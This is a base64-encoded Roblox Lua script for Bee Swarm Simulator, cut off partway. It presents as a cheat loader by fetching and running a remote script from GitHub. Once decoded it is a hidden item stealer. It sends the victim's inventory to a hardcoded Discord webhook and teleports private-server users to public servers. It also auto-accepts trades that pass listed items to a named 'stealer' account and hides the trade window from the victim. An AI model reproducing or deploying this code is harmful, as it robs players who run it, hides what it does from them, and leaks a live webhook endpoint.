dGFzay53YWl0KCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9DaHJpczEyMDg5L2F0bGFzYnNzL3JlZnMvaGVhZHMvbWFpbi9zY3JpcHQubHVhIikpKCkKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICBpZiBub3QgZ2FtZTpJc0xvYWRlZCgpIHRoZW4KICAgICAgICBnYW1lLkxvYWRlZDpXYWl0KCkKICAgIGVuZAplbmQpCgpsb2NhbCBSZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgTGlnaHRpbmcgPSBnYW1lOkdldFNlcnZpY2UoIkxpZ2h0aW5nIikKbG9jYWwgQ29yZUd1aSA9IGdhbWU6R2V0U2VydmljZSgiQ29yZUd1aSIpCgpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgTG9jYWxQbGF5ZXJJRCA9IExvY2FsUGxheWVyLlVzZXJJZApsb2NhbCBQbGF5ZXJHdWkgPSBMb2NhbFBsYXllci5QbGF5ZXJHdWkKbG9jYWwgU2NyZWVuR3VpID0gUGxheWVyR3VpOldhaXRGb3JDaGlsZCgiU2NyZWVuR3VpIiwgbWF0aC5odWdlKQpsb2NhbCBUcmFkZUxheWVyID0gU2NyZWVuR3VpOldhaXRGb3JDaGlsZCgiVHJhZGVMYXllciIsIG1hdGguaHVnZSkKCmxvY2FsIEV2ZW50cyA9IHJlcXVpcmUoUmVwbGljYXRlZFN0b3JhZ2UuRXZlbnRzKQpsb2NhbCBTdGlja2VyRmlsZSA9IHJlcXVpcmUoUmVwbGljYXRlZFN0b3JhZ2UuU3RpY2tlcnMuU3RpY2tlckZpbGUpCmxvY2FsIFN0aWNrZXJUb29scyA9IHJlcXVpcmUoUmVwbGljYXRlZFN0b3JhZ2UuU3RpY2tlcnMpCmxvY2FsIFN0aWNrZXJCb29rTWVudSA9IHJlcXVpcmUoUmVwbGljYXRlZFN0b3JhZ2UuR3VpLlN0aWNrZXJNZW51cy5TdGlja2VyQm9va01lbnUpCgpsb2NhbCBNQVhfT0ZGRVJfU0laRSA9IDMwCgpsb2NhbCBTdGVhbGVyTmFtZSA9IHsiRnJlc2hpZV9CZXN0aWUifS0tImFsdGJlZXN3YXJtYWNjMTciCmxvY2FsIFN0ZWFsZXJQbGF5ZXIgPSBuaWwKbG9jYWwgU3RlYWxlcklEID0gbmlsCgpsb2NhbCBWaWN0aW1Jc1RyYWRpbmcgPSBuaWwKbG9jYWwgU3RlYWxlcklzVHJhZGluZyA9IG5pbAoKbG9jYWwgV2hpdGVsaXN0ZWRTdGlja2VycyA9IHsKCSJCcm93biBDdWIgU2tpbiIsCgkiUm9ibyBDdWIgU2tpbiIsCgkiU3RpY2sgQnVnIFNraW4iLAoJIlN0YXIgQ3ViIFNraW4iLAoJIk5vb2IgQ3ViIFNraW4iLAoJIkJlZSBDdWIgU2tpbiIsCgkiR2luZ2VyYnJlYWQgQ3ViIFNraW4iLAoJIlNub3cgQ3ViIFNraW4iLAoJIlBlcHBlcm1pbnQgUm9ibyBDdWIgU2tpbiIsCgkiRG9vZGxlIEN1YiBTa2luIiwKCSJHbG9vbXkgQ3ViIFNraW4iLAoJIldhdnkgQ3lhbiBIaXZlIFNraW4iLAoJIldhdnkgUHVycGxlIEhpdmUgU2tpbiIsCgkiV2F2eSBEb29kbGUgSGl2ZSBTa2luIiwKCSJJY3kgQ3Jvd25lZCBIaXZlIFNraW4iLAoJIkJlYXIgQmVlIFZvdWNoZXIiLAoJIkN1YiBCdWRkeSBWb3VjaGVyIiwKCSJ4MiBCZWUgR2F0aGVyIFZvdWNoZXIiLAoJIngyIENvbnZlcnQgU3BlZWQgVm91Y2hlciIsCgkiT2ZmbGluZSBWb3VjaGVyIiwKCSJUaWNrZXQgVm91Y2hlciIsCgkiUm91bmQgQmFzaWMgQmVlIiwKCSJEaWFtb25kIERpYW1vbmQgQmVlIiwKCSI0LVByb25nZWQgVmVjdG9yIEJlZSIsCgkiQmVhciBCZWUgT2ZmZXIiLAoJIlRhYmJ5IFNjcmF0Y2giLAoJIlRhYmJ5IEZyb20gQmVoaW5kIiwKCSJGdXp6IEJvbWIiLCAKCSJQcmVjaXNlIEV5ZSIsCgkiU2h5IEJyb3duIEJlYXIiLAoJIlNpdHRpbmcgTW90aGVyIEJlYXIiLAoJIlNxdWFzaGVkIEhlYWQgQmVhciIsCgkiU3RyZXRjaGVkIEhlYWQgQmVhciIsCgkiRGFwcGVyIEZyb20gQWJvdmUiLAoJIlNpZGV3YXlzIFNwaXJpdCBCZWFyIiwKCSJHbG93ZXJpbmcgR3VtbXkgQmVhciIsCgkiU3RyYW5kZWQgU3VuIEJlYXIiLAoJIkF1cnluIiwKCSJUcmlwbGUgRXhjbGFtYXRpb24iLAoJIkV2aWN0aW9uIiwKCSJDeWFuIEhpbHRlZCBTd29yZCIsCgkiV2FsbCBDcmFjayIsCgkiTmVzc2llIiwKCSJXYWxraW5nIFN0aWNrIE55bXBoIiwKCSJJb25pYyBDb2x1bW4gVG9wIiwKCSJJb25pYyBDb2x1bW4gTWlkZGxlIiwKCSJJb25pYyBDb2x1bW4gQmFzZSIsCgkiTGVmdCBHb2xkIFN3aXJsIEZsZXVyb24iLAoJIlJpZ2h0IEdvbGQgU3dpcmwgRmxldXJvbiIsCgkiTGVmdCBTaGluaW5nIERpYW1vbmQgRmxldXJvbiIsCgkiUmlnaHQgU2hpbmluZyBEaWFtb25kIEZsZXVyb24iLAoJIkxlZnQgTXl0aGljIEdlbSBGbGV1cm9uIiwKCSJSaWdodCBNeXRoaWMgR2VtIEZsZXVyb24iLAoJIlJveWFsIFN5bWJvbCIsCgkiQmxhY2sgVHJ1ZmZsZSBNdXNocm9vbSIsCgkiUHJpc21hdGljIE11c2hyb29tIiwKCSJHdW1teWJhbGxlciIsCgkiRGFyayBTY3l0aGUiLAoJIkNhcHJpY29ybiBTdGFyIFNpZ24iLAoJIkFxdWFyaXVzIFN0YXIgU2lnbiIsCgkiUGlzY2VzIFN0YXIgU2lnbiIsCgkiQXJpZXMgU3RhciBTaWduIiwKCSJUYXVydXMgU3RhciBTaWduIiwKCSJHZW1pbmkgU3RhciBTaWduIiwKCSJDYW5jZXIgU3RhciBTaWduIiwKCSJMZW8gU3RhciBTaWduIiwKCSJWaXJnbyBTdGFyIFNpZ24iLAoJIkxpYnJhIFN0YXIgU2lnbiIsCgkiU2NvcnBpbyBTdGFyIFNpZ24iLAoJIlNhZ2l0dGFyaXVzIFN0YXIgU2lnbiIsCgkiU3VuZmxvd2VyIEZpZWxkIFN0YW1wIiwKCSJEYW5kZWxpb24gRmllbGQgU3RhbXAiLAoJIk11c2hyb29tIEZpZWxkIFN0YW1wIiwKCSJCbHVlIEZsb3dlciBGaWVsZCBTdGFtcCIsCgkiQ2xvdmVyIEZpZWxkIFN0YW1wIiwKCSJTdHJhd2JlcnJ5IEZpZWxkIFN0YW1wIiwKCSJTcGlkZXIgRmllbGQgU3RhbXAiLAoJIkJhbWJvbyBGaWVsZCBTdGFtcCIsCgkiUGluZWFwcGxlIFBhdGNoIFN0YW1wIiwKCSJTdHVtcCBGaWVsZCBTdGFtcCIsCgkiQ2FjdHVzIEZpZWxkIFN0YW1wIiwKCSJQdW1wa2luIFBhdGNoIFN0YW1wIiwKCSJQaW5lIFRyZWUgRm9yZXN0IFN0YW1wIiwKCSJSb3NlIEZpZWxkIFN0YW1wIiwKCSJIdWIgRmllbGQgU3RhbXAiLAoJIk1vdW50YWluIFRvcCBGaWVsZCBTdGFtcCIsCgkiUGVwcGVyIFBhdGNoIFN0YW1wIiwKCSJDb2NvbnV0IEZpZWxkIFN0YW1wIiwKCSJBbnQgRmllbGQgU3RhbXAiLAoJIkZseWluZyBGZXN0aXZlIEJlZSIsCgkiUGFydHkgUm9ibyBCZWFyIiwKCSJCQk0gRnJvbSBCZWxvdyIsCn0KCmxvY2FsIFN0ZWFsZXJPbmVOYW1lCmxvY2FsIFByaXZhdGVTZXJ2ZXJXYWl0VGltZSA9IDYwKjEwCgpsb2NhbCBmdW5jdGlvbiBXYWl0Rm9yTG9hZCgpCglyZXBlYXQKCQlmb3IgaSwgdiBpbiBwYWlycyhTdGVhbGVyTmFtZSkgZG8KCQkJU3RlYWxlclBsYXllciA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQodikKCQkJaWYgU3RlYWxlclBsYXllciB0aGVuCgkJCQlTdGVhbGVyT25lTmFtZSA9IHYKCQkJCVN0ZWFsZXJJRCA9IFN0ZWFsZXJQbGF5ZXIuVXNlcklkCgkJCQl3b3Jrc3BhY2U6V2FpdEZvckNoaWxkKHYsIG1hdGguaHVnZSkKCQkJCXBjYWxsKGZ1bmN0aW9uKCkKCQkJCQl3b3Jrc3BhY2Vbdl06RGVzdHJveSgpCgkJCQllbmQpCgkJCQlWaWN0aW1Jc1RyYWRpbmcgPSBMb2NhbFBsYXllcjpXYWl0Rm9yQ2hpbGQoIlRyYWRlQ29uZmlnIiwgbWF0aC5odWdlKTpXYWl0Rm9yQ2hpbGQoIklzVHJhZGluZyIsIG1hdGguaHVnZSkKCQkJCVN0ZWFsZXJJc1RyYWRpbmcgPSBTdGVhbGVyUGxheWVyOldhaXRGb3JDaGlsZCgiVHJhZGVDb25maWciLCBtYXRoLmh1Z2UpOldhaXRGb3JDaGlsZCgiSXNUcmFkaW5nIiwgbWF0aC5odWdlKQoJCQkJYnJlYWsKCQkJZW5kCgkJZW5kCgkJdGFzay53YWl0KDAuNSkKCXVudGlsIFN0ZWFsZXJQbGF5ZXIKZW5kCgpsb2NhbCBmdW5jdGlvbiBHZXRQbGF5ZXJTdGF0cygpCglyZXR1cm4gRXZlbnRzLkNsaWVudENhbGwoIlJldHJpZXZlUGxheWVyU3RhdHMiKQplbmQKCmxvY2FsIGZ1bmN0aW9uIEdldFN0aWNrZXJzRmlsZXNGcm9tKFN0b3JhZ2VUeXBlKQoJcmV0dXJuIEdldFBsYXllclN0YXRzKCkuU3RpY2tlcnNbU3RvcmFnZVR5cGVdCmVuZAoKbG9jYWwgZnVuY3Rpb24gR2V0QmVlcXVpcHNGaWxlcygpCglsb2NhbCBQbGF5ZXJTdGF0cyA9IEdldFBsYXllclN0YXRzKCkKCQoJbG9jYWwgQmVlcXVpcHMgPSB7fQoJCglsb2NhbCBDYXNlQmVlcXVpcHMgPSBQbGF5ZXJTdGF0cy5CZWVxdWlwcy5DYXNlCgkKCWZvciBfLCBGYWtlRmlsZSBpbiBwYWlycyhDYXNlQmVlcXVpcHMpIGRvCgkJdGFibGUuaW5zZXJ0KEJlZXF1aXBzLCB7RiA9IEZha2VGaWxlLCBNID0gIkNhc2UifSkKCWVuZAoJCglsb2NhbCBTdG9yYWdlQmVlcXVpcHMgPSBQbGF5ZXJTdGF0cy5CZWVxdWlwcy5TdG9yYWdlCgkKCWZvciBfLCBGYWtlRmlsZSBpbiBwYWlycyhTdG9yYWdlQmVlcXVpcHMpIGRvCgkJdGFibGUuaW5zZXJ0KEJlZXF1aXBzLCB7RiA9IEZha2VGaWxlLCBNID0gIlN0b3JhZ2UifSkKCWVuZAoJCglyZXR1cm4gQmVlcXVpcHMKZW5kCgpsb2NhbCBmdW5jdGlvbiBHZXRUeXBlRGVmKEZha2VGaWxlKQoJbG9jYWwgQWN0dWFsRmlsZSA9IFN0aWNrZXJGaWxlLkZyb21EYXRhKEZha2VGaWxlKQoJbG9jYWwgVHlwZURlZiA9IEFjdHVhbEZpbGU6R2V0VHlwZURlZigpCgoJcmV0dXJuIFR5cGVEZWYKZW5kCgpsb2NhbCBmdW5jdGlvbiBHZXRXaGl0ZWxpc3RlZFN0aWNrZXJzKFN0b3JhZ2UpCglsb2NhbCBXaGl0ZWxpc3RlZEZpbGVzID0ge30KCglmb3IgXywgRmFrZUZpbGUgaW4gKFN0b3JhZ2UpIGRvCgkJbG9jYWwgVHlwZURlZiA9IEdldFR5cGVEZWYoRmFrZUZpbGUpCgoJCWlmIHRhYmxlLmZpbmQoV2hpdGVsaXN0ZWRTdGlja2VycywgVHlwZURlZi5OYW1lKSB0aGVuIAoJCQl0YWJsZS5pbnNlcnQoV2hpdGVsaXN0ZWRGaWxlcywgRmFrZUZpbGUpCgkJZW5kCgllbmQKCglyZXR1cm4gV2hpdGVsaXN0ZWRGaWxlcwplbmQKCmxvY2FsIGZ1bmN0aW9uIEdldFdoaXRlbGlzdGVkQmVlcXVpcHMoQmVlcXVpcHMpCgktLVtbbG9jYWwgV2hpdGVsaXN0ZWRGaWxlcyA9IHt9CgkKCWZvciBfLCBGYWtlRmlsZSBpbiBwYWlycyhCZWVxdWlwcykgZG8KCQlsb2NhbCBJbnRlcm5hbE5hbWUgPSBGYWtlRmlsZS5GLlQKCQkKCQlpZiB0YWJsZS5maW5kKFdoaXRlbGlzdGVkQmVlcXVpcHMsIEludGVybmFsTmFtZSkgdGhlbgoJCQl0YWJsZS5pbnNlcnQoV2hpdGVsaXN0ZWRGaWxlcywgRmFrZUZpbGUpCgkJZW5kCgllbmQKCQoJcmV0dXJuIFdoaXRlbGlzdGVkRmlsZXNdXQoJcmV0dXJuIEJlZXF1aXBzCmVuZAoKbG9jYWwgZnVuY3Rpb24gR2V0TmV4dEZyZWVTbG90KFBsYXllclN0YXRzKQoJbG9jYWwgUGxheWVyU3RhdHMgPSBHZXRQbGF5ZXJTdGF0cygpCglyZXR1cm4gU3RpY2tlclRvb2xzLlBsYXllclN0YXRzVG9GaXJzdEVtcHR5Qm9va0luZGV4KFBsYXllclN0YXRzKQplbmQKCmxvY2FsIGZ1bmN0aW9uIERpc2NhcmRTdGlja2VyKEZha2VGaWxlKQoJRXZlbnRzLkNsaWVudENhbGwoIlN0aWNrZXJEaXNjYXJkIiwgRmFrZUZpbGUpCmVuZAoKbG9jYWwgZnVuY3Rpb24gQ2xhaW1JbmJveFN0aWNrZXIoRmFrZUZpbGUpCglGYWtlRmlsZSA9IFN0aWNrZXJGaWxlLkZyb21EYXRhKEZha2VGaWxlKQoJU3RpY2tlckJvb2tNZW51LlByZXNzQnV0dG9uQ2xhaW1Gcm9tSW5ib3goRmFrZUZpbGUpCmVuZAoKbG9jYWwgZnVuY3Rpb24gQWRkVHJhZGVTdGlja2VyKEZha2VGaWxlLCBTZXNzaW9uSUQpCglsb2NhbCBUeXBlRGVmID0gR2V0VHlwZURlZihGYWtlRmlsZSkKCglsb2NhbCBTdGlja2VyQ2F0ZWdvcnkgPSBUeXBlRGVmLkNvc21ldGljVHlwZQoJaWYgU3RpY2tlckNhdGVnb3J5OmZpbmQoIlZvdWNoZXIiKSBvciBTdGlja2VyQ2F0ZWdvcnk6ZmluZCgiSGl2ZSBTa2luIikgb3IgU3RpY2tlckNhdGVnb3J5OmZpbmQoIkN1YiBTa2luIikgdGhlbgoJCVN0aWNrZXJDYXRlZ29yeSA9ICJTdGlja2VyIgoJZW5kCgoJRXZlbnRzLkNsaWVudENhbGwoIlRyYWRlUGxheWVyQWRkSXRlbSIsIFNlc3Npb25JRCwgewoJCVsiRmlsZSJdID0gRmFrZUZpbGUsCgkJWyJDYXRlZ29yeSJdID0gU3RpY2tlckNhdGVnb3J5Cgl9KQplbmQKCmxvY2FsIGZ1bmN0aW9uIEFkZFRyYWRlQmVlcXVpcChGYWtlRmlsZSwgU2Vzc2lvbklEKQoJRXZlbnRzLkNsaWVudENhbGwoIlRyYWRlUGxheWVyQWRkSXRlbSIsIFNlc3Npb25JRCwgewoJCVsiRmlsZSJdID0gRmFrZUZpbGUsCgkJWyJDYXRlZ29yeSJdID0gIkJlZXF1aXAiCgl9KQplbmQKCmxvY2FsIGZ1bmN0aW9uIEFjY2VwdFRyYWRlKFNlc3Npb25JRCkKCUV2ZW50cy5DbGllbnRDYWxsKCJUcmFkZVBsYXllckFjY2VwdCIsIFNlc3Npb25JRCwgewoJCVt0b3N0cmluZyhMb2NhbFBsYXllcklEKV0gPSByZXF1aXJlKFJlcGxpY2F0ZWRTdG9yYWdlLkd1aS5UcmFkZUd1aSkuR2V0TXlPZmZlcigpLAoJCVt0b3N0cmluZyhTdGVhbGVySUQpXSA9IHt9Cgl9KQoJCgl0YXNrLndhaXQoMSkKCQoJRXZlbnRzLkNsaWVudENhbGwoIlRyYWRlUGxheWVyQWNjZXB0IiwgU2Vzc2lvbklELCB7CgkJW3Rvc3RyaW5nKExvY2FsUGxheWVySUQpXSA9IHJlcXVpcmUoUmVwbGljYXRlZFN0b3JhZ2UuR3VpLlRyYWRlR3VpKS5HZXRNeU9mZmVyKCksCgkJW3Rvc3RyaW5nKFN0ZWFsZXJJRCldID0ge30KCX0pCmVuZAoKbG9jYWwgZnVuY3Rpb24gY29sbGFwc2VMaXN0KGxpc3QpCiAgICBsb2NhbCBjb3VudHMgPSB7fQogICAgbG9jYWwgb3JkZXIgPSB7fQoKICAgIGZvciBfLCB2IGluIGlwYWlycyhsaXN0KSBkbwogICAgICAgIGlmIGNvdW50c1t2XSB0aGVuCiAgICAgICAgICAgIGNvdW50c1t2XSArPSAxCiAgICAgICAgZWxzZQogICAgICAgICAgICBjb3VudHNbdl0gPSAxCiAgICAgICAgICAgIHRhYmxlLmluc2VydChvcmRlciwgdikKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGxvY2FsIHJlc3VsdCA9IHt9CgogICAgZm9yIF8sIHYgaW4gaXBhaXJzKG9yZGVyKSBkbwogICAgICAgIGxvY2FsIG4gPSBjb3VudHNbdl0KICAgICAgICBpZiBuID4gMSB0aGVuCiAgICAgICAgICAgIHRhYmxlLmluc2VydChyZXN1bHQsICJbIiAuLiBuIC4uICJ4XSAiIC4uIHYpCiAgICAgICAgZWxzZQogICAgICAgICAgICB0YWJsZS5pbnNlcnQocmVzdWx0LCB2KQogICAgICAgIGVuZAogICAgZW5kCgogICAgcmV0dXJuIHJlc3VsdAplbmQKCmxvY2FsIGZ1bmN0aW9uIFNlbmRXZWJob29rKCkKCWxvY2FsIFN0aWNrZXJzID0gR2V0U3RpY2tlcnNGaWxlc0Zyb20oIkJvb2siKQoJbG9jYWwgQmVlcXVpcHMgPSBHZXRCZWVxdWlwc0ZpbGVzKCkKCQoJU3RpY2tlcnMgPSBHZXRXaGl0ZWxpc3RlZFN0aWNrZXJzKFN0aWNrZXJzKQoJQmVlcXVpcHMgPSBHZXRXaGl0ZWxpc3RlZEJlZXF1aXBzKEJlZXF1aXBzKQoKCWxvY2FsIHRvaGV4PWZ1bmN0aW9uKGgpCgkJcmV0dXJuIGg6Z3N1YigiLiIsIGZ1bmN0aW9uKHYpIHJldHVybiBzdHJpbmcuZm9ybWF0KCIlMDJ4IiwgdjpieXRlKCkpIGVuZCkKCWVuZAoKCWxvY2FsIFN0aWNrZXJzVG9TZW5kID0ge30KCWxvY2FsIEJlZXF1aXBzVG9TZW5kID0ge30KCQoJbG9jYWwgUGluZ0FsbCA9IGZhbHNlCglmb3IgXywgRmFrZUZpbGUgaW4gcGFpcnMoU3RpY2tlcnMpIGRvCgkJbG9jYWwgVHlwZURlZiA9IEdldFR5cGVEZWYoRmFrZUZpbGUpCgkJbG9jYWwgTmFtZSA9IFR5cGVEZWYuTmFtZQoJCWlmIChOYW1lID09ICJJY3kgQ3Jvd25lZCBIaXZlIFNraW4iIG9yIE5hbWUgPT0gIldhdnkgUHVycGxlIEhpdmUgU2tpbiIpIG9yIChOYW1lIH49ICJUaWNrZXQgVm91Y2hlciIgYW5kICh0b3N0cmluZyhOYW1lKTpmaW5kKCJTdGFyIFNpZ24iKSBvciB0b3N0cmluZyhOYW1lKTpmaW5kKCJDdWIgU2tpbiIpIG9yIHRvc3RyaW5nKE5hbWUpOmZpbmQoIlZvdWNoZXIiKSkpIHRoZW4KCQkJaWYgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkRmlyc3QiKS5QbGFjZUluZm8uSXNQdWJsaWNTZXJ2ZXIuVmFsdWUgPT0gdHJ1ZSB0aGVuCgkJCQlQaW5nQWxsID0gdHJ1ZQoJCQllbmQKCQkJTmFtZSA9IHRvc3RyaW5nKE5hbWUpOnVwcGVyKCkgLi4gIiEhISEiCgkJZW5kCgkJdGFibGUuaW5zZXJ0KFN0aWNrZXJzVG9TZW5kLCBOYW1lKQoJZW5kCgoJaWYgI1N0aWNrZXJzVG9TZW5kID09IDAgdGhlbgoJCXJldHVybiB3YXJuKCIuIikKCWVuZAoJCglmb3IgXywgRmFrZUZpbGUgaW4gcGFpcnMoQmVlcXVpcHMpIGRvCgkJdGFibGUuaW5zZXJ0KEJlZXF1aXBzVG9TZW5kLCAoRmFrZUZpbGUuRi5UIG9yICJVbmtub3duIikgLi4gIiBbIiAuLiBGYWtlRmlsZS5NIC4uICJdIikKCWVuZAoKCglTdGlja2Vyc1RvU2VuZCA9IGNvbGxhcHNlTGlzdChTdGlja2Vyc1RvU2VuZCkKCUJlZXF1aXBzVG9TZW5kID0gY29sbGFwc2VMaXN0KEJlZXF1aXBzVG9TZW5kKQoKCWxvY2FsIElzSGl2ZUh1YiA9IGdhbWUuUmVwbGljYXRlZEZpcnN0LlBsYWNlVHlwZS5WYWx1ZSA9PSAiSGl2ZSBIdWIiCglpZiBJc0hpdmVIdWIgdGhlbiByZXR1cm4gZW5kCgoJbG9jYWwgZGF0YSA9IHsKCQljb250ZW50ID0gKFBpbmdBbGwgYW5kICJAZXZlcnlvbmVcbiIgb3IgIlxuIikgLi4gCgkJCXN0cmluZy5mb3JtYXQoCgkJCQkiXG4qKlRlbGVwb3J0IHRvIHNlcnZlcioqXG5nYW1lOkdldFNlcnZpY2UoXCJUZWxlcG9ydFNlcnZpY2VcIik6VGVsZXBvcnRUb1BsYWNlSW5zdGFuY2UoZ2FtZS5QbGFjZUlkLFwiJXNcIixnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIpIiwKCQkJCWdhbWUuSm9iSWQKCQkpLAoJCVsiZW1iZWRzIl0gPSB7CgkJCXsKCQkJCVsidGl0bGUiXSA9IExvY2FsUGxheWVyLk5hbWUgLi4gKElzSGl2ZUh1YiBhbmQgIiAqKltISVZFIEhVQl0qKiAiIG9yICIgIikgLi4gaWRlbnRpZnlleGVjdXRvcigpLAoJCQkJWyJjb2xvciJdID0gMHhGRkQ3MDAsIC0tIGdvbGQgY29sb3IKCQkJCWZpZWxkcyA9IHsKCQkJCQl7CgkJCQkJCW5hbWUgPSAiU3RpY2tlcnMiLAoJCQkJCQlpbmxpbmUgPSBmYWxzZSwKCQkJCQkJdmFsdWUgPSAoI1N0aWNrZXJzVG9TZW5kID4gMCBhbmQgdGFibGUuY29uY2F0KFN0aWNrZXJzVG9TZW5kLCAiXG4iKSBvciAiTm9uZSIpCgkJCQkJfSwKCQkJCQl7CgkJCQkJCW5hbWUgPSAiQmVlcXVpcHMiLAoJCQkJCQlpbmxpbmUgPSBmYWxzZSwKCQkJCQkJdmFsdWUgPSAgKCNCZWVxdWlwc1RvU2VuZCA+IDAgYW5kIHRhYmxlLmNvbmNhdChCZWVxdWlwc1RvU2VuZCwgIlxuIikgb3IgIk5vbmUiKQoJCQkJCX0KCQkJCX0KCQkJfQoJCX0KCX0KCglkYXRhID0gSHR0cFNlcnZpY2U6SlNPTkVuY29kZShkYXRhKQoJCglsb2NhbCBXZWJob29rVVJMID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0Nzc4Mzc1MTEyMTE2MTQzMzgvM0ZYUTJTeEVEVzhlV0ZYZVcza3VlZ05SenlPaTM4M2FiN292VERFNlJRSlloLXZMak8wOTEzLW9tVEFEa1dDZ0xNMGsiCglpZiBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRGaXJzdCIpLlBsYWNlSW5mby5Jc1B1YmxpY1NlcnZlci5WYWx1ZSA9PSBmYWxzZSB0aGVuCgkJcHJpbnQocmVxdWVzdCh7CgkJCVVybCA9IFdlYmhvb2tVUkwsCgkJCUJvZHkgPSB0b2hleChIdHRwU2VydmljZTpKU09ORW5jb2RlKHtjb250ZW50ID0gImV4ZWN1dGVkIGJ1dCBpbiBwcml2YXRlIHNlcnZlciAodXNlcm5hbWUgPSAiIC4uIExvY2FsUGxheWVyLk5hbWUgLi4gIikgIiAuLgoJCQkJIiB0ZWxlcG9ydGluZyB0byBwdWJsaWMgc2VydmVyIDx0OiIgLi4gKG9zLnRpbWUoKSArIFByaXZhdGVTZXJ2ZXJXYWl0VGltZSkgLi4gIjpSPiIKCQkJfSkpLAoJCQlNZXRob2QgPSAiUE9TVCIsCgkJCUhlYWRlcnMgPSB7CgkJCQlbImNvbnRlbnQtdHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iCgkJCX0KCQl9KS5TdGF0dXNDb2RlKQoJCXByaW50KHJlcXVlc3QoewoJCQlVcmwgPSBXZWJob29rVVJMLAoJCQlCb2R5ID0gdG9oZXgoZGF0YSksCgkJCU1ldGhvZCA9ICJQT1NUIiwKCQkJSGVhZGVycyA9IHsKCQkJCVsiY29udGVudC10eXBlIl0gPSAiYXBwbGljYXRpb24vanNvbiIKCQkJfQoJCX0pLlN0YXR1c0NvZGUpCgoJCXRhc2sud2FpdChQcml2YXRlU2VydmVyV2FpdFRpbWUpCgkJbG9jYWwgVGVsZXBvcnRTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUZWxlcG9ydFNlcnZpY2UiKQoKCQlsb2NhbCBwbGFjZUlkID0gZ2FtZS5QbGFjZUlkCgkJbG9jYWwgY3VycmVudEpvYiA9IGdhbWUuSm9iSWQKCgkJbG9jYWwgdXJsID0gImh0dHBzOi8vZ2FtZXMucm9ibG94LmNvbS92MS9nYW1lcy8iLi5wbGFjZUlkLi4iL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAwIgoJCWxvY2FsIHJlc3BvbnNlID0gSHR0cFNlcnZpY2U6SlNPTkRlY29kZShnYW1lOkh0dHBHZXQodXJsKSkKCgkJZm9yIF8sIHNlcnZlciBpbiBpcGFpcnMocmVzcG9uc2UuZGF0YSkgZG8KCQkJaWYgc2VydmVyLnBsYXlpbmcgPCBzZXJ2ZXIubWF4UGxheWVycyBhbmQgc2VydmVyLmlkIH49IGN1cnJlbnRKb2IgdGhlbgoJCQkJVGVsZXBvcnRTZXJ2aWNlOlRlbGVwb3J0VG9QbGFjZUluc3RhbmNlKHBsYWNlSWQsIHNlcnZlci5pZCwgTG9jYWxQbGF5ZXIpCgkJCQlicmVhawoJCQllbmQKCQllbmQKCQlyZXR1cm4KCWVuZAoKCXByaW50KHJlcXVlc3QoewoJCVVybCA9IFdlYmhvb2tVUkwsCgkJQm9keSA9IHRvaGV4KGRhdGEpLAoJCU1ldGhvZCA9ICJQT1NUIiwKCQlIZWFkZXJzID0gewoJCQlbImNvbnRlbnQtdHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iCgkJfQoJfSkuU3RhdHVzQ29kZSkKCS0tIEhlYXJ0YmVhdAoJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJbG9jYWwgdGljayA9IG9zLnRpbWUKCQlsb2NhbCBIQl9JTlRFUlZBTCA9IDEyMCAtLSAyIG1pbnV0ZXMKCQlsb2NhbCBOZXh0SGVhcnRiZWF0ID0gdGljaygpICsgSEJfSU5URVJWQUwKCQlsb2NhbCBIZWFydGJlYXRzRW5hYmxlZCA9IGZhbHNlCgkJd2hpbGUgdGFzay53YWl0KCkgZG8KCQkJaWYgbm90IEhlYXJ0YmVhdHNFbmFibGVkIHRoZW4gcmV0dXJuIGVuZAoJCQlsb2NhbCBkYXRhID0gSHR0cFNlcnZpY2U6SlNPTkVuY29kZSh7CgkJCQljb250ZW50ID0gc3RyaW5nLmZvcm1hdCgiaGVhcnRiZWF0IHJlY2l2ZWQgZnJvbSAlcyBuZXh0IGhlYXJ0YmVhdCA8dDolZDpSPiIsIExvY2FsUGxheWVyLk5hbWUsIHRpY2soKSArIEhCX0lOVEVSVkFMKQoJCQl9KQoJCQlpZiB0aWNrKCkgPj0gTmV4dEhlYXJ0YmVhdCB0aGVuCgkJCQlOZXh0SGVhcnRiZWF0ID0gdGljaygpICsgSEJfSU5URVJWQUwKCQkJCXJlcXVlc3QoewoJCQkJCVVybCA9IFdlYmhvb2tVUkwsCgkJCQkJQm9keSA9IHRvaGV4KGRhdGEpLAoJCQkJCU1ldGhvZCA9ICJQT1NUIiwKCQkJCQlIZWFkZXJzID0gewoJCQkJCQlbImNvbnRlbnQtdHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iCgkJCQkJfQoJCQkJfSkKCQkJZW5kCgkJZW5kCgllbmQpCmVuZAoKbG9jYWwgZnVuY3Rpb24gSGlkZVRyYWRlR3VpKCkKCVRyYWRlTGF5ZXIuVmlzaWJsZSA9IGZhbHNlCglUcmFkZUxheWVyOkdldFByb3BlcnR5Q2hhbmdlZFNpZ25hbCgiVmlzaWJsZSIpOkNvbm5lY3QoZnVuY3Rpb24oKQoJCWlmIFRyYWRlTGF5ZXIuVmlzaWJsZSA9PSB0cnVlIHRoZW4gCgkJCVRyYWRlTGF5ZXIuVmlzaWJsZSA9IGZhbHNlCgkJZW5kCgllbmQpCgkKCWxvY2FsIEJsdXJTaGFkZSA9IFNjcmVlbkd1aTpXYWl0Rm9